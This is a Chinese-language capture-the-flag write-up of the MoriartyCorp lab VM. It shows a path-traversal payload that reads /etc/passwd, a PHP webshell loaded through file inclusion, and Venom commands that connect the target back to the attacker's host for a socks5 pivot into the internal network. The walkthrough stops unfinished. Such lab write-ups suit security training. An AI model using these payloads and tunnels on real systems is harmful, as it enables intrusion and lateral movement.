# 打靶-MoriartyCorp

<div class="has-toc have-toc">
</div>

## 0x00 准备工作

查看靶机的描述信息，这里说明了flag的格式等。

```
Description

Hello Agent.

You're here on a special mission.

A mission to take down one of the biggest weapons suppliers which is Moriarty Corp.

Enter flag{start} into the webapp to get started!

Notes:

Web panel is on port 8000 (not in scope. Don’t attack)
Flags are stored in #_flag.txt format. Flags are entered in flag{} format. They're usually stored in / directory but can be in different locations.
To temporarily stop playing, pause the VM. Do not shut it down.
The webapp starts docker containers in the background when you add flags. Shutting down and rebooting will mess it up.
(the story is bad. sorry for the lack of creativity)
```

## 0x01 flag1

扫描端口，发现开放8000,22,9000。<figure class="wp-block-image size-full">

<img loading="lazy" width="705" height="292" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-150.png" alt="" class="wp-image-3819" /> </figure> 

浏览器上一下web服务8000，发现是用来提交flag的，同时我们也知道了第一个flag，`flag{start}`。<figure class="wp-block-image size-full">

<img loading="lazy" width="1667" height="714" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-151.png" alt="" class="wp-image-3824" /> </figure> 

## 0x02 flag2

提交flag后，出现新信息，80端口开放了。<figure class="wp-block-image size-full">

<img loading="lazy" width="1867" height="344" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-153.png" alt="" class="wp-image-3828" /> </figure> 

访问web服务<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-154.png" alt="" class="wp-image-3829" width="430" height="184" /> </figure> 

点击超链接后，怀疑存在文件包含。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-155.png" alt="" class="wp-image-3830" width="431" height="151" /> </figure> 

构造`file=../../../../../../../etc/passwd`，能够得到相应的信息。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-156.png" alt="" class="wp-image-3831" width="680" height="455" /> </figure> 

在/var/www/html中编写一句话木马，然后开启apache服务。<figure class="wp-block-image size-full">

<img loading="lazy" width="1182" height="94" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-157.png" alt="" class="wp-image-3832" /> </figure> 

用蚁剑连接一下。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-158.png" alt="" class="wp-image-3833" width="401" height="66" /> </figure> 

在根目录下找到第二个flag。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-159.png" alt="" class="wp-image-3835" width="325" height="92" /> </figure> 

## 0x03 flag3

根据提示信息接下来需要扫描内网172.17.0.3-254<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-161.png" alt="" class="wp-image-3837" width="900" height="119" /> </figure> 

需要利用内网代理工具<a rel="noreferrer noopener" target="_blank" href="https://github.com/Dliv3/Venom/" rel="nofollow" >Venom</a>，先用蚁剑上传文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="949" height="30" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-164.png" alt="" class="wp-image-3841" /> </figure> 

使用`./admin_linux_x64 -lport 2333`，监听2333端口。然后靶机使用`./agent_linux_x64 -rhost 10.0.2.4 -rport 2333`，连接kali。<figure class="wp-block-image size-full">

<img loading="lazy" width="1260" height="197" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-165.png" alt="" class="wp-image-3843" /> </figure> 

新节点建立成功。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-167.png" alt="" class="wp-image-3845" width="734" height="264" /> </figure> 

然后开启socks5代理，监听1080端口。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-168.png" alt="" class="wp-image-3847" width="695" height="143" /> </figure> 

`vim /etc/proxychains.conf`编辑socks配置文件，添加最后一行，使得socks5连接本地的1080端口，然后proxychains不要启用DNS代理，#proxy_dns。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-169.png" alt="" class="wp-image-3849" width="234" height="110" /> </figure> 

配置完成后，在命令前面加proxychains即可，使用sock5代理。然后开始利用nmap进行内网主机扫描。

之后靶机的docker开不起来，扫不到内网主机，就离谱，调试了很久也没法解决，先埋个坑吧，补上大佬的全流程。

<a href="http://www.maidang.cool/2021/39310.html#flag2" target="_blank" rel="noreferrer noopener" rel="nofollow" >http://www.maidang.cool/2021/39310.html#flag2</a>
